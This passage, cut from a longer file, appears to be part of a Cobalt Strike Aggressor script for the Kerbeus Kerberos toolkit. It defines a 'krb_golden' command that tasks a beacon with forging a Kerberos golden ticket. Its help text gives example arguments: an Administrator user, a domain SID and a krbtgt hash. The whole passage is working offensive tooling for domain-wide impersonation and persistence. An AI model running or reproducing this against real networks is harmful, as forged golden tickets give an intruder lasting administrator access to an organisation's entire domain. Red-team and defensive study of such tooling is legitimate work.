    "   krb_golden /user:USER /domain:DOMAIN /sid:SID /aes256:HASH [/id:RID] [/ptt]\n\n" .
    "Example:\n" .
    "   krb_golden /user:Administrator /domain:CORP.LOCAL /sid:S-1-5-21-123-456-789 /krbtgt:aad3b435...\n"
);

alias krb_golden {
    local('$bid $args');
    $bid = $1;
    $args = substr($0, 11);
    btask($bid, "Kerbeus: Forging Golden Ticket");
    kerbeus_exec($bid, "krb_golden", $args);
}

